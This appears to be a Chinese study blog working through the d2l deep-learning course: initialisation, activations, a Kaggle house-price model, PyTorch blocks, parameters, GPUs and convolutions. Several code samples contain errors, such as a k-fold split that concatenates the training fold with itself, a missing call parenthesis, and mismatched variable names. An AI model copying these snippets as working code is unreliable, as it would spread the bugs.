我们可以使用如下方式来保证权重的这一特性 权重初始化 在合理值区间里随机初始化参数 因为训练开始的时候更容易有数值不稳定，远离最优解的地方损失函数表面可能很复杂，最优解附近表面会比较平整 使用N(0,0.01)来初始化权重可能对小网络没问题，但不能保证深度神经网络 我们使用一个MLP来举例（此处忽略激活函数）： 那么正向的方差为： 其中第三行到第二行的公式是由于Wi,jt和hjt−1W_{i,j}^t 和 h_{j}^{t-1}Wi,jt​和hjt−1​的均值为0，那么均值的平方也为0，则补充上这两项之后可以转为方差。 此处我们另E[Wi,jt]=γtE[W_{i,j}^t] = \\gamma_tE[Wi,jt​]=γt​ 然后反向的方差： 由此我们得到两个条件： nt−1γt=1n_{t-1} \\gamma _t = 1nt−1​γt​=1 ntγt=1n_{t} \\gamma _t = 1nt​γt​=1 但是通常这两个条件同时满足很困难，除非输入和输出维度相等，而Xavier则是在这一基础上做了一个权衡 Xavier初始 激活函数选择 我们再来看看为了满足期望为0方差不变的条件，激活函数需要具备怎样的特征： 此处我们先使用线性激活函数来计算特征，同样分别讨论正向和反向： 正向 反向 可见正向和反向，如果需要达到目标，当我们的激活函数为斜率为1的正比例函数时，效果最好，因此我们来看看我们的各种激活函数，并使用泰勒展开将其分解为多个简单的指数函数： 可见在一个很小的区间内，tanh和relu函数是更符合要求的，而sigmoid并不那么符合要求。所以为什么tanh和relu函数在真实训练中使用的更多。 同时我们也可以对sigmoid函数进行一些调整，例如如下操作： sigmoid′=4×sigmoid−2sigmoid&#x27; = 4 \\times sigmoid - 2sigmoid′=4×sigmoid−2 可见调整后的sigmoid、tanh和relu函数在中间的位置更符合要求。 Kaggle房价预测 亲手搭建一个预测模型： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154import pandas as pdimport numpy as npimport torchfrom torch import nnfrom d2l import torch as d2lDATA_HUB = dict()DATA_URL = &#x27;http://d2l-data.s3-accelerate.amazonaws.com/&#x27;DATA_HUB[&#x27;kaggle_house_train&#x27;] = ( DATA_URL + &#x27;kaggle_house_pred_train.csv&#x27;, &#x27;585e9cc93e70b39160e7921475f9bcd7d31219ce&#x27;)DATA_HUB[&#x27;kaggle_house_test&#x27;] = ( DATA_URL + &#x27;kaggle_house_pred_test.csv&#x27;, &#x27;fa19780a7b011d9b009e8bff8e99922a8ee2eb90&#x27;)# 下载数据集train_data = pd.read_csv(d2l.download(&#x27;kaggle_house_train&#x27;))test_data = pd.read_csv(d2l.download(&#x27;kaggle_house_test&#x27;))print(train_data.shape)print(test_data.shape)print(train_data.iloc[0:4, [0, 1, 2, 3, -3, -2, -1]])# 删掉第一列id# 并且取出训练数据的最后一列all_feature = pd.concat((train_data.iloc[:, 1:-1], test_data.iloc[:, 1:]))print(all_feature.shape)print(all_feature.iloc[0:4, :])numeric_features = all_feature.dtypes[all_feature.dtypes != &#x27;object&#x27;].index# 将数值均值变成0，方差变成1all_feature[numeric_features] = all_feature[numeric_features].apply( lambda x: (x - x.mean()) / (x.std()))# 将NA数据替换为均值all_feature[numeric_features] = all_feature[numeric_features].fillna(0)# 使用one-hot处理离散值all_feature = pd.get_dummies(all_feature, dummy_na=True)# 使用one-hot编码处理离散值会使特征变大print(all_feature.shape)# 从pandas格式种提取NumPy格式，并将其转换为Tensorn_train = train_data.shape[0]train_features = torch.tensor( all_feature[:n_train].values, dtype=torch.float32)test_features = torch.tensor( all_feature[n_train:].values, dtype=torch.float32)train_labels = torch.tensor( train_data.SalePrice.values.reshape(-1, 1), dtype=torch.float32)# 训练loss = nn.MSELoss()in_features = train_features.shape[1]# 网络def get_net(): net = nn.Sequential( nn.Linear(in_features, 1) ) return net# 误差# 为了防止更大的值将会带来更大的误差，我们通常使用# (y - y&#x27;)/y# 为了防止除法，对上述式子再取对数def log_rmse(net, features, labels): # 对于输出为INF的值，将其替换为1 clipped_preds = torch.clamp(net(features), 1, float(&#x27;inf&#x27;)) rmse = torch.sqrt(loss(torch.log(clipped_preds), torch.log(labels))) return rmse.item()# 训练def train(net, train_features, train_labels, test_features, test_labels, num_epochs, learning_rate, weight_decay, batch_size): train_ls, test_ls = [], [] train_iter = d2l.load_array((train_features, train_labels), batch_size) # 这里使用的是Adam优化算法，其对初始学习率不那么敏感 optimizer = torch.optim.Adam(net.parameters(), lr=learning_rate, weight_decay=weight_decay) for epoch in range(num_epochs): for X, y in train_iter: optimizer.zero_grad() l = loss(net(X), y) l.backward() optimizer.step() train_ls.append(log_rmse(net, train_features, train_labels)) if test_labels is not None: test_ls.append(log_rmse(net, test_features, test_labels)) return train_ls, test_ls# K折交叉验证def get_k_fold_data(k, i, x, y): assert k &gt; 1 fold_size = x.shape[0] // k x_train, y_train = None, None for j in range(k): idx = slice(j*fold_size, (j + 1) * fold_size) x_part, y_part = x[idx, :], y[idx] if j == i: x_valid, y_valid = x_part, y_part elif x_train is None: x_train, y_train = x_part, y_part else: x_train = torch.cat([x_train, x_train], 0) y_train = torch.cat([y_train, y_train], 0) return x_train, y_train, x_valid, y_validdef k_fold(k, x_train, y_train, num_epochs, learning_rate, weight_decay, batch_size): train_l_sum, valid_l_sum = 0, 0 for i in range(k): data = get_k_fold_data(k, i, x_train, y_train) net = get_net() train_ls, valid_ls = train( net, *data, num_epochs, learning_rate, weight_decay, batch_size) train_l_sum += train_ls[-1] valid_l_sum += valid_ls[-1] if i == 0: d2l.plot(list(range(1, num_epochs + 1)), [train_ls, valid_ls], xlabel=&#x27;epoch&#x27;, ylabel=&#x27;rmse&#x27;, xlim=[1, num_epochs], legend=[&#x27;train&#x27;, &#x27;valid&#x27;], yscale=&#x27;log&#x27;) print(f&#x27;折&#123;i + 1&#125;，训练log rmse&#123;float(train_ls[-1]):f&#125;, &#x27; f&#x27;验证log rmse&#123;float(valid_ls[-1]):f&#125;&#x27;) return train_l_sum / k, valid_l_sum / k## k, num_epochs, lr, weight_decay, batch_size = 5, 100, 5, 0, 64k, num_epochs, lr, weight_decay, batch_size = 5, 150, 5, 0.08, 64train_l, valid_l = k_fold(k, train_features, train_labels, num_epochs, lr, weight_decay, batch_size)print(f&#x27;&#123;k&#125;-折验证: 平均训练log rmse: &#123;float(train_l):f&#125;, &#x27; f&#x27;平均验证log rmse: &#123;float(valid_l):f&#125;&#x27;)d2l.plt.show() 未调参之前的结果 PyTorch深度学习 层与块 在实际研究中我们发现，研究讨论比单个层大，但比整个模型小的组件更有价值。里热ResNet-152就有数百层。这些层是由*层组（groups of layers）*的重复模式组成的。 因此我们给出块的定义： 块（block）可以描述单个层、由多个层组成的组件或整个模型本身 下图描述了一个由层组成块，由块组成层的过程： 从编程的角度来看，我们将块用类表示。它必须包含： 一个将其输入转换为输出的前向传播函数 必需的参数 反向传播函数 由上面三项熟悉我们可以大致将块需要实现的功能进行归纳： 将输入数据作为前向传播函数的参数 通过前向传播函数生成输出 计算其输出关于输入的梯度，并可通过方向传播函数进行访问 存储和访问前向传播计算所需参数 柑橘需要初始化模型参数 以此我们可以自定义一个块，下面我们以一个MLP块为例： 123456789101112131415161718192021import torchfrom torch import nnfrom torch.nn import functional as Fclass MLP(nn.Module): # 初始化 def __init__(self): super().__init__() self.hidden = nn.Linear(20, 256) # 隐藏层 self.out = nn.Linear(256, 10) # 输出层 # 前向传播 def forward(self, x): return self.out(F.relu(self.hidden(x)))x = torch.rand(2, 20)net = MLP()print(net(x)) 事实上我们继承了nn.Module后就无需自己实现反向传播函数了 顺序块 PyTorch中我们使用Secquential来构建具备顺序执行能力的连续层。我们也可以尝试构建自己的顺序快，我们需要实现两个关键功能： 将块逐个追加到列表中的函数 用于将输入按块顺序传递的链条 12345678910111213141516# 顺序快class MySequential(nn.Module): def __init__(self, *args): super().__init__() for idx, module in enumerate(args): # 此处使用了父类中的熟悉_modules，其类型为OrderedDict # 且第kay指定类型str，value指定类型为Module self._modules[str(idx)] = module def forward(self, x): # 使用OrderedDict保证了调用层级的顺序 for block in self._modules.values(): x = block(x) return x _modules的主要优点是： 在模块的参数初始化过程中， 系统知道在_modules字典中查找需要初始化参数的子块。 前向传播中执行代码 有些架构需要在前向传播的过程中进行一些变换，例如参数固定的线性变换，或加入一些控制流。 123456789101112131415161718# 前向传播时执行代码class FixedHiddenMLP(nn.Module): def __init__(self): super.__init__() # 创建一个不会被更新的参数 self.rand_weight = torch.rand((20, 20), requires_grad=False) self.linear = nn.Linear(20, 20) def forward(self, x): x = self.linear(x) # 进入ReLU之前先对线性层结果进行了一次固定参数的线性变换 x = F.relu(torch.mm(x, self.rand_weight) + 1) x = self.linear(x) # 控制流 while x.abs().sum &gt; 1: x /= 2 return x.sum() 混合块 我们还可以混合搭配上面定义的各种块。 12345678910111213141516# 混合搭配class NestMLP(nn.Module): def __init__(self): super().__init__() self.net = nn.Sequential(nn.Linear(20, 64), nn.ReLU(), nn.Linear(64, 32), nn.ReLU()) self.linear = nn.Linear(32, 16) def forward(self, X): return self.linear(self.net(X))chimera = nn.Sequential(NestMLP(), nn.Linear(16, 20), FixedHiddenMLP())print(chimera(x)) 参数管理 PyTorch允许我们直接访问参数，访问方法和访问Dict非常类似，并且可以直接通过名称来访问某个神经元的权重和偏置： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import torchfrom torch import nnnet = nn.Sequential(nn.Linear(4, 8), nn.ReLU(), nn.Linear(8, 1))x = torch.rand(size=(2, 4))print(net(x))# 提取第二个神经网络中的参数# 下标为Sequential中输入参数的位置print(net[2].state_dict())# TODO:访问指定参数print(type(net[2].bias))print(net[2].bias)print(net[2].bias.data)print(net.state_dict()[&#x27;2.bias&#x27;].data)# 访问参数梯度print(net[2].weight.grad)# 访问全部参数print(*[(name, params.shape) for name, params in net[0].named_parameters()])print(*[(name, params.shape) for name, params in net.named_parameters()])# TODO:访问嵌套块的参数def block1(): return nn.Sequential(nn.Linear(4, 8), nn.ReLU(), nn.Linear(8, 4), nn.ReLU())def block2(): net = nn.Sequential() for i in range(4): # 在这里嵌套 net.add_module(f&#x27;block &#123;i&#125;&#x27;, block1()) return netrgnet = nn.Sequential(block2(), nn.Linear(4, 1))rgnet(X)print(rgnet) 这使得我们对参数进行初始化会非常方便。 默认情况下，PyTorch会根据一个范围均匀地初始化权重和偏置矩阵， 这个范围是根据输入和输出维度计算出的。 PyTorch的nn.init模块提供了多种预置初始化方法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import torchfrom torch import nnnet = nn.Sequential(nn.Linear(4, 8), nn.ReLU(), nn.Linear(8, 1))x = torch.rand(size=(2, 4))print(net(x))# TODO:内置初始化器初始化参数def init_normal(m): if type(m) == nn.Linear: nn.init.normal_(m.weight, mean=0, std=0.01) nn.init.zeros_(m.bias)net.apply(init_normal)net[0].weight.data[0], net[0].bias.data[0]# TODO:使用常数初始化参数def init_constant(m): if type(m) == nn.Linear: nn.init.constant_(m.weight, 1) nn.init.zeros_(m.bias)net.apply(init_constant)net[0].weight.data[0], net[0].bias.data[0]# TODO:不同层使用不同的初始化方案def init_xavier(m): if type(m) == nn.Linear: nn.init.xavier_uniform_(m.weight)def init_42(m): if type(m) == nn.Linear: nn.init.constant_(m.weight, 42)net[0].apply(init_xavier)net[2].apply(init_42)print(net[0].weight.data[0])print(net[2].weight.data)# TODO:自定义初始化def my_init(m): if type(m) == nn.Linear: print(&quot;Init&quot;, *[(name, param.shape) for name, param in m.named_parameters()][0]) nn.init.uniform_(m.weight, -10, 10) m.weight.data *= m.weight.data.abs() &gt;= 5net.apply(my_init)print(net[0].weight[:2])# TODO:共享参数的层# 我们需要给共享层一个名称，以便可以引用它的参数shared = nn.Linear(8, 8)net = nn.Sequential(nn.Linear(4, 8), nn.ReLU(), shared, nn.ReLU(), shared, nn.ReLU(), nn.Linear(8, 1))net(X)# 检查参数是否相同print(net[2].weight.data[0] == net[4].weight.data[0])net[2].weight.data[0, 0] = 100# 确保它们实际上是同一个对象，而不只是有相同的值print(net[2].weight.data[0] == net[4].weight.data[0]) 延后初始化 可以发现我们在定义网络时，并未指定输入维度，添加层时也没有指定前一层的输出维度，初始化参数时也没有足够的信息来确定模型应该包含多少参数。 而这一切都被框架的延后初始化（defers initialization），即直到数据第一次通过模型传递时，框架才会动态地判断出每个层的大小。 需要注意的是，PyTorch中并没有提供一个稳定的内置延迟初始化功能，目前可以是使用torch.nn.LazyLinear进行试用。此处我们使用TensorFlow进行实验 12345678910import tensorflow as tf# TODO: 定义网络net = tf.keras.models.Sequential([ tf.keras.layers.Dense(256, activation=tf.nn.relu), tf.keras.layers.Dense(10),])# TODO: 访问网络参数print([net.layers[i].get_weights() for i in range(len(net.layers))]) 发现结果为: 1[[],[]] 然后我们让数据通过网络，再来看看网络参数 123X = tf.random.uniform((2, 20))net(X)print([w.shape for w in net.get_weights()]) 结果如下： 1[(20, 256), (256,), (256, 10), (10,)] 自定义层 不带参数的层 只需要继承基类并实现前向传播功能即可： 1234567891011import torchimport torch.nn.functional as Ffrom torch import nnclass CenteredLayer(nn.Module): def __init__(self): super().__init__() def forward(self, X): return x - x.mean() 下面我们向该层提供一些数据： 12layer = CenteredLayer()print(layer(torch.FloatTensor([1, 2, 3, 4, 5]))) 1tensor([-2., -1., 0., 1., 2.]) 接下来就能把该层作为组件合并到更复杂的模型中了： 1net = nn.Sequential(nn.Linear(8, 128), CenteredLayer()) 作为额外的健全性检查，我们可以在向该网络发送随机数据后，检查均值是否为0。 由于我们处理的是浮点数，因为存储精度的原因，我们仍然可能会看到一个非常小的非零数。 12Y = net(torch.rand(4,8))print(Y.mean()) 1tensor(0., grad_fn=&lt;MeanBackward0&gt;) 带参数的层 除了不带参数的层，我们还可以通过内置函数来创建参数，这些函数提供了一些基本的管理功能，比如：管理访问呢、初始化、共享、保存和加载模型参数。这样我们就不需要为每个自定义层编写自定义的序列化程序。 12345678class MyLinear(nn.Module): def __init__(self, in_units, units): super().__init__() self.weight = nn.Parameter(torch.randn(in_units, units)) self.bias = nn.Parameter(torch.randn(units,)) def forward(self, X): linear = torch.matmul(X, self.weight.data) + self.bias.data return F.relu(linear) 接下来，我们实例化MyLinear类并访问其模型参数 12linear = MyLinear(5, 3)print(linear.weight) 123456Parameter containing:tensor([[-1.4779, -0.6027, -0.2225], [ 1.1270, -0.6127, -0.2008], [-2.1864, -1.0548, 0.2558], [ 0.0225, 0.0553, 0.4876], [ 0.3558, 1.1427, 1.0245]], requires_grad=True) 自定义层可以直接执行前向传播计算： 1print(linear(torch.rand(2, 5))) 12tensor([[0.0000, 0.0000, 0.2187], [0.0000, 0.0000, 0.0000]]) 也可以直接用于模型构建： 12net = nn.Sequential(MyLinear(64, 8), MyLinear(8, 1))print(net(torch.rand(2, 64))) 12tensor([[ 7.4571], [12.7505]]) 读写文件 有时我们希望保存训练的模型， 以备将来在各种环境中使用（比如在部署中进行预测）。 此外，当运行一个耗时较长的训练过程时， 最佳的做法是定期保存中间结果， 以确保在服务器电源被不小心断掉时，我们不会损失几天的计算结果。 因此，需要学习如何加载和存储权重向量和整个模型了。 加载和保存张量 使用save(tensor,'name')进行保存 并使用load('name')进行加载 123456789import torchfrom torch import nnfrom torch.nn import functional as Fx = torch.arange(4)torch.save(x, &#x27;x-file&#x27;)x2 = torch.load(&#x27;x-file&#x27;)print(x2) 1tensor([0, 1, 2, 3]) save()还能存储一张量列表 1234y = torch.zeros(4)torch.save([x, y],&#x27;x-files&#x27;)x2, y2 = torch.load(&#x27;x-files&#x27;)(x2, y2) 还能直接读取map&lt;String, Tensor&gt; 1234mydict = &#123;&#x27;x&#x27;: x, &#x27;y&#x27;: y&#125;npx.save(&#x27;mydict&#x27;, mydict)mydict2 = npx.load(&#x27;mydict&#x27;)mydict2 得到结果 1&#123;&#x27;x&#x27;: array([0., 1., 2., 3.]), &#x27;y&#x27;: array([0., 0., 0., 0.])&#125; 保存模型参数 我们使用熟悉的三层MLP来进行实验： 123456789101112class MLP(nn.Module): def __init__(self): super().__init__() self.hidden = nn.Linear(20, 256) self.output = nn.Linear(256, 10) def forward(self, x): return self.output(F.relu(self.hidden(x)))net = MLP()X = torch.randn(size=(2, 20))Y = net(X) 接下来保存一下模型的参数： 1torch.save(net.state_dict(), &#x27;mlp.params&#x27;) 然后我们实例化一个多层感知机模型的备份，并用刚刚存储的参数来设置参数： 123clone = MLP()clone.load_state_dict(torch.load(&#x27;mlp.params&#x27;))print(clone.eval()) 1234MLP( (hidden): Linear(in_features=20, out_features=256, bias=True) (output): Linear(in_features=256, out_features=10, bias=True)) 然后我们比较一下两个模型： 12Y_clone = clone(X)Y_clone == Y 12tensor([[True, True, True, True, True, True, True, True, True, True], [True, True, True, True, True, True, True, True, True, True]]) GPU训练 访问GPU PyTorch允许我们访问GPU的数量和单个GPU，我们使用如下代码来查看机器上可以用的GPU： 12345678import torchfrom torch import nngpu_num = torch.cuda.device_count()print(gpu_num)for i in range(gpu_num): print(torch.device(&#x27;cuda&#x27; + &#x27;:&#x27; + str(i)))print(torch.device(&#x27;cpu&#x27;)) 1231cuda:0cpu 下面我们可以创建两个工具来保证我们不会访问空GPU： 12345678910111213def try_gpu(i=0): #@save &quot;&quot;&quot;如果存在，则返回gpu(i)，否则返回cpu()&quot;&quot;&quot; if torch.cuda.device_count() &gt;= i + 1: return torch.device(f&#x27;cuda:&#123;i&#125;&#x27;) return torch.device(&#x27;cpu&#x27;)def try_all_gpus(): #@save &quot;&quot;&quot;返回所有可用的GPU，如果没有GPU，则返回[cpu(),]&quot;&quot;&quot; devices = [torch.device(f&#x27;cuda:&#123;i&#125;&#x27;) for i in range(torch.cuda.device_count())] return devices if devices else [torch.device(&#x27;cpu&#x27;)]try_gpu(), try_gpu(10), try_all_gpus() 123(device(type=&#x27;cuda&#x27;, index=0), device(type=&#x27;cpu&#x27;), [device(type=&#x27;cuda&#x27;, index=0), device(type=&#x27;cuda&#x27;, index=1)]) 张量与GPU PyTorch中每个张量都具有device属性，用来记录其保存的位置： 12X = torch([1,2,3])print(X.device) 1device(type=&#x27;cpu&#x27;) 当我们需要进行多张量操作时，我们必须保证这些张量位于同一个设备上。 我们可以使用刚刚准备好的两个工具来将张量放置在GPU上： 12X = torch.ones(2, 3, device=try_gpu())print(X) 12tensor([[1., 1., 1.], [1., 1., 1.]], device=&#x27;cuda:0&#x27;) 在GPU上创建的张量只消耗这个GPU的显存。 我们可以使用nvidia-smi命令查看显存使用情况。 一般来说，我们需要确保不创建超过GPU显存限制的数据。 对于位于不同GPU上的张量，我们需要将其中一个张量复制到另一个GPU上才能进行相应操作： 123Z = X.cuda(1)print(X)print(Z) 得到结果： 1234tensor([[1., 1., 1.], [1., 1., 1.]], device=&#x27;cuda:0&#x27;)tensor([[1., 1., 1.], [1., 1., 1.]], device=&#x27;cuda:1&#x27;) 如果对已经存在第一个GPU上的张量调用cuda(0)则会返回该张量本身，而不是它的复制： 1X.cuda(0) is Z 1True 神经网络与GPU 同样模型参数也可以放在GPU上： 12net = nn.Sequential(nn.Linear(3,1))net = net.to(device=try_gpu()) 向网络输入张量时，模型将再同一GPU上计算结果 1print(net(X)) 12tensor([[0.5737], [0.5737]], device=&#x27;cuda:0&#x27;, grad_fn=&lt;AddmmBackward0&gt;) 让我们确认一下 1print(net[0].weight.data.device) 1cuda:0 卷积神经网络 卷积的理解 当我们对图像进行处理时，通常每张照片具有百万级的像素，这就意味着网络的每次输入都会有一百万个维度，即使将隐藏层降低到1000个神经元，这个连接层也将有106×103=10910^6 \\times 10^3 = 10^9106×103=109个参数。 但如今人类和机器都能很好地区分猫和狗，英文图像中本就拥有丰富的结构，而这些结构可以被人类和机器学习模型使用。 而卷积神经网络就是机器学习利用自然图像中一些一直结构的创造性方法。 首先我们思考在图像识别任务中，有哪些结构可以为我们的是被提供帮助。 事实上儿童游戏&quot;沃尔多在哪里&quot;为我们提供了不错的灵感： 平移不变性：不管检测对象在哪个位置，识别器将有同样的结果 局部性：识别器往往不需要全局的审视整张图片 下面我们先来看看如何把普通的全连接层变为能够处理二维图片的全连接层： 其中WijW_{ij}Wij​表示第i层全连接的第j个参数。 然后我们思考如何将两个原则融入其中： 首先是平移不变性 即我们不希望我们用于识别的权重会因为采用了不同的输入X而变得不同，即对于该神经元的所有输入X，我们使用相同的一个权重矩阵。 其次对于局部性： 我们只希望观察xi,jx_{i,j}xi,j​这个像素周围小范围内的点，因此我们将区间[i−Δ,i+Δ],[j−Δ,j+Δ][i-\\Delta, i + \\Delta],[j-\\Delta, j+\\Delta][i−Δ,i+Δ],[j−Δ,j+Δ]范围外的权重设为0。 卷积层 所谓二维卷积层，就是该层神经元可以学习一个用于对输入进行卷积的矩阵： 此处需要注意的是交叉相关和卷积的区别 可见二维卷积中卷积核需要进行反转，但实际使用中卷积核都是对称的，因此没有区别 我们从数学的角度重新来看看对于连续函数的卷积： (f∗g)(x)=∫f(z)g(x−z)dz(f * g)(x) = \\int f(z)g(x-z)dz(f∗g)(x)=∫f(z)g(x−z)dz 即卷积将一个函数&quot;翻转&quot;并移位x时，测量f和g之间的重叠。当为离散对象时，积分则变成了求和 (f∗g)(i)=∑af(a)g(i−a)(f*g)(i)=\\sum _a f(a)g(i-a)(f∗g)(i)=∑a​f(a)g(i−a) 对于二维张量： (f∗g)(i,h)=∑a∑bf(a,b)g(i−a,j−b)(f*g)(i,h) = \\sum_a\\sum_bf(a,b)g(i-a, j-b)(f∗g)(i,h)=∑a​∑b​f(a,b)g(i−a,j−b) 可见从数学的角度，我们也可得到与上述结果相近的结果。 下面我们来实现一下二维互相关于运算： 1234567891011121314151617181920212223242526272829import torchfrom torch import nnfrom d2l import torch as d2l# TODO: 二维互相关运算def corr2d(X, K): &quot;&quot;&quot;二维互相关运算 Args: X (Tensor(w,h)): 原始图片 K (Tensor(x,y)): 卷积核 Returns: Tensor(w-x+ 1, h-y+1): 卷积后的图片 &quot;&quot;&quot; h, w = K.shape Y = torch.zeros((X.shape[0] - h + 1, X.shape[1] - w + 1)) for i in range(Y.shape[0]): for j in range(Y.shape[1]): Y[i, j] = (X[i:i+h, j:j+w] * K).sum() return YX = torch.tensor([[0.0, 1.0, 2.0], [3.0, 4.0, 5.0], [6.0, 7.0, 8.0]])K = torch.tensor([[0.0, 1.0], [2.0, 3.0]])print(corr2d(X, K)) 12tensor([[19., 25.], [37., 43.]]) 接着我们借助互相关运算来实现一下卷积层，卷积层将包含一个需要学习的卷积核，和一个需要学习的偏置值，而前向传播函数就是二维互相关运算： 12345678class Conv2D(nn.Module): def __init__(self, kernel_size): super().__init__() self.weight = nn.Parameter(torch.rand(kernel_size)) self.bias = nn.Parameter(torch.zeros(1)) def forward(self, x): return corr2d(x, self.weight) + self.bias 接下来我们尝试训练一个卷积层： 123456789101112131415161718192021222324252627# TODO: 模拟一个边缘检测任务X = torch.ones((6, 8))X[:, 2:6] = 0K = torch.tensor([[1.0, -1.0]])Y = corr2d(X, K)# TODO: 训练二维卷积层# 具有1个输出通道和形状为(1,2)的卷积核conv2d = nn.Conv2d(1, 1, kernel_size=(1, 2), bias=False)# 二维卷积层使用4维输入输出：(批大小, 通道, 高度, 宽度)X = X.reshape((1, 1, 6, 8))Y = Y.reshape((1, 1, 6, 7))lr = 3e-2 # 学习率for i in range(10): Y_hat = conv2d(X) # 使用平方误差作为损失 l = (Y_hat - Y) ** 2 conv2d.zero_grad() l.sum().backward() # 迭代卷积核 conv2d.weight.data[:] -= lr * conv2d.weight.grad if (i + 1) % 2 == 0: print(f&#x27;epoch &#123;i+1&#125;, loss &#123;l.sum():.3f&#125;&#x27;)print(conv2d.weight.data.reshape((1, 2))) 123456epoch 2, loss 7.283epoch 4, loss 2.041epoch 6, loss 0.678epoch 8, loss 0.251epoch 10, loss 0.098tensor([[ 0.9578, -1.0216]]) 可以看到学习到的卷积核与自定义的卷积核十分接近 特征映射与感受野 对于上图中的卷积层，有时被成为特征映射（feature map），因为它可以视为一个输入映射到下一层的空间维度的转换器。 而对于某一层的任意元素x，其*感受野（receptive field）*是指在前向传播期间可能影响x计算的所有元素，例如对于输出元素19，它的感受野就是输入部分的四个蓝色区域，感受野大小为4，即卷积核大小。 同理如果我们在这一层的输出后再添加一层相同的卷积层，那么我们将得到单个元素z，z对于中间层Y的感受野则包括我们输出的全部四个元素19、25、37、43，而对于输入来说，其感受野则为全部9个元素。 因此，越深的特征，感受野越大，越浅的特征感受野越小 步长与填充（stride &amp; padding） 对于32 * 32的图片，如果才有5 * 5的卷积核，那么得到的输出为： 第一层输出28 * 28 第七层输出4 * 4 可见，更大的卷积核将更快地减小输出大小，我们可以总结出如下规律 对于nh×nwn_h \\times n_wnh​×nw​的输入图片，kh×kwk_h \\times k_wkh​×kw​的卷积核 经过一次卷积的输出为(nh−kh+1)×(nw−kw+1)(n_h - k_h + 1) \\times (n_w - k_w +1)(nh​−kh​+1)×(nw​−kw​+1) 这就意味着卷积核的大小限制了我们的网络层数 填充 为了解决问题，其中一种解决方式就是再输入周围添加额外的行和列 可见我们的输入甚至比以前更大了。 对于填充了php_hph​行pwp_wpw​列的输入，我们的输出将变为 (nh−kh+ph+1)×(nw−kw+pw+1)(n_h -k_h + p_h + 1) \\times (n_w - k_w + p_w + 1)(nh​−kh​+ph​+1)×(nw​−kw​+pw​+1) 通常我们取ph=kh−1,pw=kw−1p_h = k_h -1, p_w = k_w - 1ph​=kh​−1,pw​=kw​−1使得图片大小不变 当khk_hkh​为奇数时，在上下两侧填充ph/2p_h/2ph​/2 为偶数时，在上侧填充⌈ph/2⌉\\lceil p_h / 2 \\rceil⌈ph​/2⌉，下侧填充⌊ph/2⌋\\lfloor p_h/2 \\rfloor⌊ph​/2⌋向下取整 步幅 但如果我们希望减小需要训练的参数，常规的思路是增大卷积核的大小，但事实上随着卷积核大小的增加，感受野也随之增加，那么关注的细节也将减少。（通常我们的卷积核大小会选择5或3） 这时我们可以通过增加步幅来解决这个问题。 通常情况下填充减小的输出大小与层数线性相关，当我们改变步幅，将破坏这种线性相关，甚至使其变为指数相关。 下面我们来综合考虑一下： 给定步幅为sh×sws_h \\times s_wsh​×sw​,则输出的形状为： ⌊(nh−kh+ph+sh)/sh⌋×⌊(nw−kw+pw+sw)/sw⌋\\lfloor (n_h - k_h + p_h + s_h)/s_h \\rfloor \\times \\lfloor (n_w - k_w + p_w + s_w)/s_w \\rfloor⌊(nh​−kh​+ph​+sh​)/sh​⌋×⌊(nw​−kw​+pw​+sw​)/sw​⌋ 如果ph=kh−1,pw=kw−1p_h = k_h -1, p_w = k_w - 1ph​=kh​−1,pw​=kw​−1 ⌊(nh−1+sh)/sh⌋×⌊(nw−1+sw)/sw⌋\\lfloor (n_h - 1 + s_h)/s_h \\rfloor \\times \\lfloor (n_w - 1 + s_w)/s_w \\rfloor⌊(nh​−1+sh​)/sh​⌋×⌊(nw​−1+sw​)/sw​⌋ 如果输入高度和宽度可以被步幅整除 (nh/sh)×(nw/sw)(n_h/s_h) \\times (n_w/s_w)(nh​/sh​)×(nw​/sw​) 下面我们来试试padding和stride的效果： 12345678910111213141516import torchfrom torch import nn# TODO: 定义一个卷积运算def comp_conv2d(conv2d, X): X = X.reshape((1, 1) + X.shape) Y = conv2d(X) return Y.reshape(Y.shape[2:])# TODO: 构建卷积网络，设置填充为左右各1像素conv2d = nn.Conv2d(1, 1, kernel_size=3, padding=1)X = torch.rand(size=(8, 8))print(comp_conv2d(conv2d, X).shape) 1torch.Size([8, 8]) 1234567# TODO: 将步幅设置为2conv2d = nn.Conv2d(1, 1, kernel_size=3, padding=1, stride=2)print(comp_conv2d(conv2d, X).shape)# TODO: 更复杂的情况conv2d = nn.Conv2d(1, 1, kernel_size=(3, 5), padding=(0, 1), stride=(3, 4))print(comp_conv2d(conv2d, X).shape) 12torch.Size([4, 4])torch.Size([2, 2]) 多输入多输出通道 通常我们的图片会由不同通道组成的，因此我们可以认为图片实际上是一个三维的张量，那么对于多通道的图片如何处理呢 多输入通道 每个通道都有一个卷积核，结果是所有通道卷积结果的和 多输出通道 我们可以有多个三维卷积核，每个核生成一个输出通道 即如果我们需要输出coc_oco​个通道，那么我们需要在输出层设置coc_oco​个三维卷积核。 1*1卷积层 对于kw=kh=1k_w = k_h = 1kw​=kh​=1的卷积层，它不识别空间的模式，而只是进行通道融合。 1*1的卷积层我们可以理解为一个全连接层 接下来让我们从总体审视一下二维卷积层： 代码实现 首先看看多输入的情况： 12345678910111213import torchfrom d2l import torch as d2l# TODO: 用于处理多个通道的卷积def corr2d_multi_in(X, K): return sum(d2l.corr2d(x, k) for x, z in zip(X, K))# TODO: 对2通道的3*3的图片进行 2*2卷积核的卷积测试，最终应该得到一个2*2的特征图X = torch.tensor([[[0.0, 1.0, 2.0], [3.0, 4.0, 5.0], [6.0, 7.0, 8.0]], [[1.0, 2.0, 3.0], [4.0, 5.0, 6.0], [7.0, 8.0, 9.0]]])K = torch.tensor([[[0.0, 1.0], [2.0, 3.0]], [[1.0, 2.0], [3.0, 4.0]]])print(corr2d_multi_in(X, K)) 12tensor([[ 56., 72.], [104., 120.]]) 然后我们再加入多输出： 12345678910111213141516171819202122# TODO: 对于多输出的情况def corr2d_multi_in_out(X, K): &quot;&quot;&quot;多通道多输出卷积 Args: X (Tensor(c,h,w)): 多通道图片 K (Tensor(o,c,h,w)): 多输出多通道卷积核 Returns: Tensor(o,Xh - Kh + 1, Xw - Kw + 1): o个输出通道的二维特征图 &quot;&quot;&quot; # 迭代“K”的第0个维度，每次都对输入“X”执行互相关运算。 # 最后将所有结果都叠加在一起 return torch.stack([corr2d_multi_in(X, k) for k in K], 0)# TODO: 